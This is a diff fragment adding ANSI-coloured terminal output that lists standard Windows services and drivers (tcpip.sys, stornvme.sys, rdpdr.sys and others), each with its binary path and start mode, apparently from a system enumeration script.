+    @ksfilter.inf,%MSKSSRV.DeviceDesc%;Microsoft Streaming Service Proxy(@ksfilter.inf,%MSKSSRV.DeviceDesc%;Microsoft Streaming Service Proxy)[[0m[1;32mC:\Windows\System32\drivers\MSKSSRV.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\mslldp.sys[0m[0m[0m,-200(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\mslldp.sys[0m[0m[0m,-200)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\mslldp.sys[0m[0m[0m] - Autoload
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\mslldp.sys[0m,-201
+[1;90m   =================================================================================================[0m
+
+    @ksfilter.inf,%MSPCLOCK.DeviceDesc%;Microsoft Streaming Clock Proxy(@ksfilter.inf,%MSPCLOCK.DeviceDesc%;Microsoft Streaming Clock Proxy)[[0m[1;32mC:\Windows\System32\drivers\MSPCLOCK.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ksfilter.inf,%MSPQM.DeviceDesc%;Microsoft Streaming Quality Manager Proxy(@ksfilter.inf,%MSPQM.DeviceDesc%;Microsoft Streaming Quality Manager Proxy)[[0m[1;32mC:\Windows\System32\drivers\MSPQM.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\Drivers\mssecflt.sys,-1001(@%SystemRoot%\System32\Drivers\mssecflt.sys,-1001)[[0m[1;32msystem32\drivers\mssecflt.sys[0m] - Boot
+    [1;37m@%SystemRoot%\System32\Drivers\mssecflt.sys,-1002
+[1;90m   =================================================================================================[0m
+
+    @mssmbios.inf,%mssmbios_svcdesc%;Microsoft System Management BIOS Driver(@mssmbios.inf,%mssmbios_svcdesc%;Microsoft System Management BIOS Driver)[[0m[1;32mC:\Windows\System32\drivers\mssmbios.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ksfilter.inf,%MSTEE.DeviceDesc%;Microsoft Streaming Tee/Sink-to-Sink Converter(@ksfilter.inf,%MSTEE.DeviceDesc%;Microsoft Streaming Tee/Sink-to-Sink Converter)[[0m[1;32mC:\Windows\System32\drivers\MSTEE.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @mtconfig.inf,%MTConfig.SVCDESC%;Microsoft Input Configuration Driver(@mtconfig.inf,%MTConfig.SVCDESC%;Microsoft Input Configuration Driver)[[0m[1;32mC:\Windows\System32\drivers\MTConfig.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\mup.sys,-101(@%systemroot%\system32\drivers\mup.sys,-101)[[0m[1;32mSystem32\Drivers\mup.sys[0m] - Boot
+    [1;37m@%systemroot%\system32\drivers\mup.sys,-102
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\drivers\nwifi.sys,-101(@%SystemRoot%\System32\drivers\nwifi.sys,-101)[[0m[1;32msystem32\DRIVERS\nwifi.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(@mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[[0m[1;32mC:\Windows\System32\drivers\ndfltr.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\ndis.sys[0m[0m[0m,-200(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\ndis.sys[0m[0m[0m,-200)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\ndis.sys[0m[0m[0m] - Boot
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\ndis.sys[0m,-201
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\ndiscap.sys[0m[0m[0m,-5000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\ndiscap.sys[0m[0m[0m,-5000)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\ndiscap.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32mSystem32\drivers\ndiscap.sys[0m,-5000
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\drivers\ndisimplatform.sys,-501(@%SystemRoot%\System32\drivers\ndisimplatform.sys,-501)[[0m[1;32mSystem32\drivers\NdisImPlatform.sys[0m] - System
+    [1;37m@%SystemRoot%\System32\drivers\ndisimplatform.sys,-501
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32001(@%systemroot%\system32\mprmsg.dll,-32001)[[0m[1;32mSystem32\DRIVERS\ndistapi.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32001
+[1;90m   =================================================================================================[0m
+
+    NDIS Usermode I/O Protocol(NDIS Usermode I/O Protocol)[[0m[1;32msystem32\drivers\ndisuio.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\drivers\NdisVirtualBus.sys,-200(@%SystemRoot%\System32\drivers\NdisVirtualBus.sys,-200)[[0m[1;32mC:\Windows\System32\drivers\NdisVirtualBus.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32002(@%systemroot%\system32\mprmsg.dll,-32002)[[0m[1;32mC:\Windows\System32\drivers\ndiswan.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32002
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32014(@%systemroot%\system32\mprmsg.dll,-32014)[[0m[1;32mSystem32\DRIVERS\ndiswan.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32014
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\ndproxy.sys,-6000(@%SystemRoot%\system32\drivers\ndproxy.sys,-6000)[[0m[1;32mSystem32\DRIVERS\NDProxy.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\ndproxy.sys,-6000
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\Ndu.sys[0m[0m[0m,-10001(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\Ndu.sys[0m[0m[0m,-10001)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\Ndu.sys[0m[0m[0m] - Autoload
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\Ndu.sys[0m,-10002
+[1;90m   =================================================================================================[0m
+
+    Network Adapter Wdf Class Extension Library(Network Adapter Wdf Class Extension Library)[[0m[1;32msystem32\drivers\NetAdapterCx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%windir%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\netbios.sys[0m[0m[0m,-503(@%windir%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\netbios.sys[0m[0m[0m,-503)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\netbios.sys[0m[0m[0m] - System
+    [1;37m@%windir%\[0m[1;32msystem32\drivers\netbios.sys[0m,-502
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\netbt.sys,-2(@%SystemRoot%\system32\drivers\netbt.sys,-2)[[0m[1;32mSystem32\DRIVERS\netbt.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\netbt.sys,-1
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\netlogon.dll,-102(@%SystemRoot%\System32\netlogon.dll,-102)[[0m[1;32mC:\Windows\system32\lsass.exe[0m] - System
+    [1;37m@%SystemRoot%\System32\netlogon.dll,-103
+[1;90m   =================================================================================================[0m
+
+    @npsvctrig.inf,%NPSVCTRIG.SvcDisplayName%;Named pipe service trigger provider(@npsvctrig.inf,%NPSVCTRIG.SvcDisplayName%;Named pipe service trigger provider)[[0m[1;32mC:\Windows\System32\drivers\npsvctrig.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\nsiproxy.sys[0m[0m[0m,-2(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\nsiproxy.sys[0m[0m[0m,-2)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\nsiproxy.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\nsiproxy.sys[0m,-1
+[1;90m   =================================================================================================[0m
+
+    @nvdimm.inf,%nvdimm.SvcDesc%;Microsoft NVDIMM device driver(@nvdimm.inf,%nvdimm.SvcDesc%;Microsoft NVDIMM device driver)[[0m[1;32mC:\Windows\System32\drivers\nvdimm.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @msports.inf,%Parport.SVCDESC%;Parallel port driver(@msports.inf,%Parport.SVCDESC%;Parallel port driver)[[0m[1;32mC:\Windows\System32\drivers\parport.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\partmgr.sys,-100(@%SystemRoot%\system32\drivers\partmgr.sys,-100)[[0m[1;32mSystem32\drivers\partmgr.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\partmgr.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @pci.inf,%pci_svcdesc%;PCI Bus Driver(@pci.inf,%pci_svcdesc%;PCI Bus Driver)[[0m[1;32mSystem32\drivers\pci.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    Performance Counters for Windows Driver(Performance Counters for Windows Driver)[[0m[1;32mSystem32\drivers\pcw.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\pdc.sys[0m[0m[0m,-100(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\pdc.sys[0m[0m[0m,-100)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\pdc.sys[0m[0m[0m] - Boot
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\pdc.sys[0m,-101
+[1;90m   =================================================================================================[0m
+
+    PEAUTH(PEAUTH)[[0m[1;32msystem32\drivers\peauth.sys[0m] - Autoload
+[1;90m   =================================================================================================[0m
+
+    @pmem.inf,%pmem.SvcDesc%;Microsoft persistent memory disk driver(@pmem.inf,%pmem.SvcDesc%;Microsoft persistent memory disk driver)[[0m[1;32mC:\Windows\System32\drivers\pmem.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @memory.inf,%PNPMEM.SvcDesc%;Microsoft Memory Module Driver(@memory.inf,%PNPMEM.SvcDesc%;Microsoft Memory Module Driver)[[0m[1;32mC:\Windows\System32\drivers\pnpmem.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32006(@%systemroot%\system32\mprmsg.dll,-32006)[[0m[1;32mC:\Windows\System32\drivers\raspptp.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32006
+[1;90m   =================================================================================================[0m
+
+    @cpu.inf,%Processor.SvcDesc%;Processor Driver(@cpu.inf,%Processor.SvcDesc%;Processor Driver)[[0m[1;32mC:\Windows\System32\drivers\processr.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%windir%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\pacer.sys[0m[0m[0m,-101(@%windir%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\pacer.sys[0m[0m[0m,-101)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\pacer.sys[0m[0m[0m] - System
+    [1;37m@%windir%\[0m[1;32mSystem32\drivers\pacer.sys[0m,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\qwavedrv.sys,-1(@%SystemRoot%\system32\drivers\qwavedrv.sys,-1)[[0m[1;32mC:\Windows\system32\drivers\qwavedrv.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\qwavedrv.sys,-2
+[1;90m   =================================================================================================[0m
+
+    Windows RAM Disk Driver(Windows RAM Disk Driver)[[0m[1;32msystem32\DRIVERS\ramdisk.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    Remote Access Auto Connection Driver(Remote Access Auto Connection Driver)[[0m[1;32mSystem32\DRIVERS\rasacd.sys[0m] - System
+    [1;37mRemote Access Auto Connection Driver
+[1;90m   =================================================================================================[0m
+
+    @netavpna.inf,%Svc-Mp-AgileVpn-DispName%;WAN Miniport (IKEv2)(@netavpna.inf,%Svc-Mp-AgileVpn-DispName%;WAN Miniport (IKEv2))[[0m[1;32mC:\Windows\System32\drivers\AgileVpn.sys[0m] - System
+    [1;37m@netavpna.inf,%Svc-Mp-AgileVpn-DispName%;WAN Miniport (IKEv2)
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32005(@%systemroot%\system32\mprmsg.dll,-32005)[[0m[1;32mC:\Windows\System32\drivers\rasl2tp.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32005
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32007(@%systemroot%\system32\mprmsg.dll,-32007)[[0m[1;32mSystem32\DRIVERS\raspppoe.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32007
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\sstpsvc.dll,-202(@%systemroot%\system32\sstpsvc.dll,-202)[[0m[1;32mC:\Windows\System32\drivers\rassstp.sys[0m] - System
+    [1;37m@%systemroot%\system32\sstpsvc.dll,-202
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\wkssvc.dll,-1000(@%systemroot%\system32\wkssvc.dll,-1000)[[0m[1;32msystem32\DRIVERS\rdbss.sys[0m] - System
+    [1;37m@%systemroot%\system32\wkssvc.dll,-1001
+[1;90m   =================================================================================================[0m
+
+    @rdpbus.inf,%rdpbus_svcdesc%;Remote Desktop Device Redirector Bus Driver(@rdpbus.inf,%rdpbus_svcdesc%;Remote Desktop Device Redirector Bus Driver)[[0m[1;32mC:\Windows\System32\drivers\rdpbus.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\DRIVERS\rdpdr.sys,-100(@%SystemRoot%\System32\DRIVERS\rdpdr.sys,-100)[[0m[1;32mSystem32\drivers\rdpdr.sys[0m] - System
+    [1;37m@%SystemRoot%\System32\DRIVERS\rdpdr.sys,-101
+[1;90m   =================================================================================================[0m
+
+    Remote Desktop Video Miniport Driver(Remote Desktop Video Miniport Driver)[[0m[1;32mSystem32\drivers\rdpvideominiport.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    ReadyBoost(ReadyBoost)[[0m[1;32mSystem32\drivers\rdyboost.sys[0m] - Boot
+    [1;37mReadyBoost
+[1;90m   =================================================================================================[0m
+
+    @rhproxy.inf,%rhproxy.SVCDESC%;Resource Hub proxy driver(@rhproxy.inf,%rhproxy.SVCDESC%;Resource Hub proxy driver)[[0m[1;32mC:\Windows\System32\drivers\rhproxy.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\Locator.exe,-2(@%systemroot%\system32\Locator.exe,-2)[[0m[1;32mC:\Windows\system32\locator.exe[0m] - System
+    [1;37m@%systemroot%\system32\Locator.exe,-3
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\lltdres.dll,-5(@%SystemRoot%\system32\lltdres.dll,-5)[[0m[1;32msystem32\drivers\rspndr.sys[0m] - Autoload
+    [1;37m@%SystemRoot%\system32\lltdres.dll,-5
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\samsrv.dll,-1(@%SystemRoot%\system32\samsrv.dll,-1)[[0m[1;32mC:\Windows\system32\lsass.exe[0m] - Autoload
+    [1;37m@%SystemRoot%\system32\samsrv.dll,-2
+[1;90m   =================================================================================================[0m
+
+    @sbp2.inf,%sbp2_ServiceDesc%;SBP-2 Transport/Protocol Bus Driver(@sbp2.inf,%sbp2_ServiceDesc%;SBP-2 Transport/Protocol Bus Driver)[[0m[1;32mSystem32\drivers\sbp2port.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\drivers\scfilter.sys,-11(@%SystemRoot%\System32\drivers\scfilter.sys,-11)[[0m[1;32mSystem32\DRIVERS\scfilter.sys[0m] - System
+    [1;37m@%SystemRoot%\System32\drivers\scfilter.sys,-12
+[1;90m   =================================================================================================[0m
+
+    @scmbus.inf,%scmbus.SvcDesc%;Microsoft Storage Class Memory Bus Driver(@scmbus.inf,%scmbus.SvcDesc%;Microsoft Storage Class Memory Bus Driver)[[0m[1;32mSystem32\drivers\scmbus.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @SDFRd.inf,%SDFRd.ServiceDesc%;SDF Reflector(@SDFRd.inf,%SDFRd.ServiceDesc%;SDF Reflector)[[0m[1;32mC:\Windows\System32\drivers\SDFRd.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @sdstor.inf,%sdstor_ServiceDesc%;SD Storage Port Driver(@sdstor.inf,%sdstor_ServiceDesc%;SD Storage Port Driver)[[0m[1;32mC:\Windows\System32\drivers\sdstor.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\SecurityHealthAgent.dll,-1002(@%systemroot%\system32\SecurityHealthAgent.dll,-1002)[[0m[1;32mC:\Windows\system32\SecurityHealthService.exe[0m] - Autoload
+    [1;37m@%systemroot%\system32\SecurityHealthAgent.dll,-1001
+[1;90m   =================================================================================================[0m
+
+    @%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1001(@%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1001)[[0m[1;32m"C:\Program Files (x86)\Windows Defender Advanced Threat Protection\MsSense.exe"[0m] - System
+    [1;37m@%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1002
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\SensorDataService.exe,-101(@%SystemRoot%\system32\SensorDataService.exe,-101)[[0m[1;32mC:\Windows\System32\SensorDataService.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\SensorDataService.exe,-102
+[1;90m   =================================================================================================[0m
+
+    Serial UART Support Library(Serial UART Support Library)[[0m[1;32msystem32\drivers\SerCx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    Serial UART Support Library(Serial UART Support Library)[[0m[1;32msystem32\drivers\SerCx2.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @msports.inf,%Serenum.SVCDESC%;Serenum Filter Driver(@msports.inf,%Serenum.SVCDESC%;Serenum Filter Driver)[[0m[1;32mC:\Windows\System32\drivers\serenum.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @msports.inf,%Serial.SVCDESC%;Serial port driver(@msports.inf,%Serial.SVCDESC%;Serial port driver)[[0m[1;32mC:\Windows\System32\drivers\serial.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @msmouse.inf,%sermouse.SvcDesc%;Serial Mouse Driver(@msmouse.inf,%sermouse.SvcDesc%;Serial Mouse Driver)[[0m[1;32mC:\Windows\System32\drivers\sermouse.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @flpydisk.inf,%sfloppy_devdesc%;High-Capacity Floppy Disk Drive(@flpydisk.inf,%sfloppy_devdesc%;High-Capacity Floppy Disk Drive)[[0m[1;32mC:\Windows\System32\drivers\sfloppy.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\Drivers\SgrmAgent.sys,-1001(@%SystemRoot%\System32\Drivers\SgrmAgent.sys,-1001)[[0m[1;32msystem32\drivers\SgrmAgent.sys[0m] - Boot
+    [1;37m@%SystemRoot%\System32\Drivers\SgrmAgent.sys,-1002
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\SgrmBroker.exe,-100(@%SystemRoot%\System32\SgrmBroker.exe,-100)[[0m[1;32mC:\Windows\system32\SgrmBroker.exe[0m] - Autoload
+    [1;37m@%SystemRoot%\System32\SgrmBroker.exe,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\snmptrap.exe,-3(@%SystemRoot%\system32\snmptrap.exe,-3)[[0m[1;32mC:\Windows\System32\snmptrap.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\snmptrap.exe,-4
+[1;90m   =================================================================================================[0m
+
+    @spaceport.inf,%Spaceport_ServiceDesc%;Storage Spaces Driver(@spaceport.inf,%Spaceport_ServiceDesc%;Storage Spaces Driver)[[0m[1;32mSystem32\drivers\spaceport.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    Holographic Spatial Graph Filter(Holographic Spatial Graph Filter)[[0m[1;32mSystem32\drivers\SpatialGraphFilter.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    Simple Peripheral Bus Support Library(Simple Peripheral Bus Support Library)[[0m[1;32msystem32\drivers\SpbCx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\spectrum.exe,-101(@%systemroot%\system32\spectrum.exe,-101)[[0m[1;32mC:\Windows\system32\spectrum.exe[0m] - System
+    [1;37m@%systemroot%\system32\spectrum.exe,-102
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\spoolsv.exe,-1(@%systemroot%\system32\spoolsv.exe,-1)[[0m[1;32mC:\Windows\System32\spoolsv.exe[0m] - Autoload
+    [1;37m@%systemroot%\system32\spoolsv.exe,-2
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\sppsvc.exe,-101(@%SystemRoot%\system32\sppsvc.exe,-101)[[0m[1;32mC:\Windows\system32\sppsvc.exe[0m] - Autoload
+    [1;37m@%SystemRoot%\system32\sppsvc.exe,-100
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\srvsvc.dll,-104(@%systemroot%\system32\srvsvc.dll,-104)[[0m[1;32mSystem32\DRIVERS\srv2.sys[0m] - System
+    [1;37m@%systemroot%\system32\srvsvc.dll,-105
+[1;90m   =================================================================================================[0m
+
+    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[[0m[1;32mC:\Windows\System32\OpenSSH\ssh-agent.exe[0m] - Manual
+    [1;37mAgent to hold private keys used for public key authentication.
+[1;90m   =================================================================================================[0m
+
+    @mshdc.inf,%storahci_ServiceDescription%;Microsoft Standard SATA AHCI Driver(@mshdc.inf,%storahci_ServiceDescription%;Microsoft Standard SATA AHCI Driver)[[0m[1;32mSystem32\drivers\storahci.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @wstorflt.inf,%service_desc%;Microsoft Hyper-V Storage Accelerator(@wstorflt.inf,%service_desc%;Microsoft Hyper-V Storage Accelerator)[[0m[1;32mSystem32\drivers\vmstorfl.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @stornvme.inf,%StorNVMe_ServiceDesc%;Microsoft Standard NVM Express Driver(@stornvme.inf,%StorNVMe_ServiceDesc%;Microsoft Standard NVM Express Driver)[[0m[1;32mSystem32\drivers\stornvme.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\drivers\storqosflt.sys,-101(@%SystemRoot%\System32\drivers\storqosflt.sys,-101)[[0m[1;32msystem32\drivers\storqosflt.sys[0m] - Autoload
+    [1;37m@%SystemRoot%\System32\drivers\storqosflt.sys,-102
+[1;90m   =================================================================================================[0m
+
+    @storufs.inf,%UfsServiceDesc%;Microsoft Universal Flash Storage (UFS) Driver(@storufs.inf,%UfsServiceDesc%;Microsoft Universal Flash Storage (UFS) Driver)[[0m[1;32mSystem32\drivers\storufs.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\tcpip.sys,-10001(@%SystemRoot%\system32\drivers\tcpip.sys,-10001)[[0m[1;32mSystem32\drivers\tcpip.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\tcpipcfg.dll,-50003
+[1;90m   =================================================================================================[0m
+
+    @todo.dll,-100;Microsoft IPv6 Protocol Driver(@todo.dll,-100;Microsoft IPv6 Protocol Driver)[[0m[1;32mSystem32\drivers\tcpip.sys[0m] - System
+    [1;37m@todo.dll,-100;Microsoft IPv6 Protocol Driver
+[1;90m   =================================================================================================[0m
+
+    TCP/IP Registry Compatibility(TCP/IP Registry Compatibility)[[0m[1;32mSystem32\drivers\tcpipreg.sys[0m] - Autoload
+    [1;37mProvides compatibility for legacy applications which interact with TCP/IP through the registry. If this service is stopped, certain applications may have impaired functionality.
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\tcpipcfg.dll,-50004(@%SystemRoot%\system32\tcpipcfg.dll,-50004)[[0m[1;32mC:\Windows\system32\DRIVERS\tdx.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\tcpipcfg.dll,-50004
+[1;90m   =================================================================================================[0m
+
+    @termmou.inf,%TermInpt.SVCDESC%;Microsoft Remote Desktop Input Driver(@termmou.inf,%TermInpt.SVCDESC%;Microsoft Remote Desktop Input Driver)[[0m[1;32mC:\Windows\System32\drivers\terminpt.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\TieringEngineService.exe,-702(@%SystemRoot%\system32\TieringEngineService.exe,-702)[[0m[1;32mC:\Windows\system32\TieringEngineService.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\TieringEngineService.exe,-701
+[1;90m   =================================================================================================[0m
+
+    @tpm.inf,%TPM%;TPM(@tpm.inf,%TPM%;TPM)[[0m[1;32mC:\Windows\System32\drivers\tpm.sys[0m] - System
+    [1;37m@tpm.inf,%TPMDesc%;TPM Driver
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\tsusbflt.sys[0m[0m[0m,-1000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\tsusbflt.sys[0m[0m[0m,-1000)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\tsusbflt.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\tsusbflt.sys[0m,-1000
+[1;90m   =================================================================================================[0m
+
+    @tsgenericusbdriver.inf,%TsUsbGD.DeviceDesc.Generic%;Remote Desktop Generic USB Device(@tsgenericusbdriver.inf,%TsUsbGD.DeviceDesc.Generic%;Remote Desktop Generic USB Device)[[0m[1;32mC:\Windows\System32\drivers\TsUsbGD.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @tsusbhub.inf,%tsusbhub.SVCDESC%;Remote Desktop USB Hub(@tsusbhub.inf,%tsusbhub.SVCDESC%;Remote Desktop USB Hub)[[0m[1;32mC:\Windows\System32\drivers\tsusbhub.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\tunnel.sys[0m[0m[0m,-501(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\tunnel.sys[0m[0m[0m,-501)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\tunnel.sys[0m[0m[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @uaspstor.inf,%UASPortName%;USB Attached SCSI (UAS) Driver(@uaspstor.inf,%UASPortName%;USB Attached SCSI (UAS) Driver)[[0m[1;32mC:\Windows\System32\drivers\uaspstor.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    USB Connector Manager KMDF Class Extension(USB Connector Manager KMDF Class Extension)[[0m[1;32mSystem32\Drivers\UcmCx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    UCM-TCPCI KMDF Class Extension(UCM-TCPCI KMDF Class Extension)[[0m[1;32mSystem32\Drivers\UcmTcpciCx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @UcmUcsi.inf,%UcmUcsi.ServiceName%;USB Connector Manager UCSI Client(@UcmUcsi.inf,%UcmUcsi.ServiceName%;USB Connector Manager UCSI Client)[[0m[1;32mC:\Windows\System32\drivers\UcmUcsi.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    USB Host Support Library(USB Host Support Library)[[0m[1;32msystem32\drivers\ucx01000.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    USB Device Emulation Support Library(USB Device Emulation Support Library)[[0m[1;32msystem32\drivers\udecx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    udfs(udfs)[[0m[1;32msystem32\DRIVERS\udfs.sys[0m] - Manual
+    [1;37mReads/Writes UDF 1.02,1.5,2.0x,2.5 disc formats, usually found on C/DVD discs. (Core) (All pieces)
+[1;90m   =================================================================================================[0m
+
+    @uefi.inf,%UEFI.SvcDesc%;Microsoft UEFI Driver(@uefi.inf,%UEFI.SvcDesc%;Microsoft UEFI Driver)[[0m[1;32mC:\Windows\System32\drivers\UEFI.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\UevAgentDriver.sys,-101(@%systemroot%\system32\drivers\UevAgentDriver.sys,-101)[[0m[1;32mC:\Windows\system32\drivers\UevAgentDriver.sys[0m] - Manual
+    [1;37m@%systemroot%\system32\drivers\UevAgentDriver.sys,-102
+[1;90m   =================================================================================================[0m
+
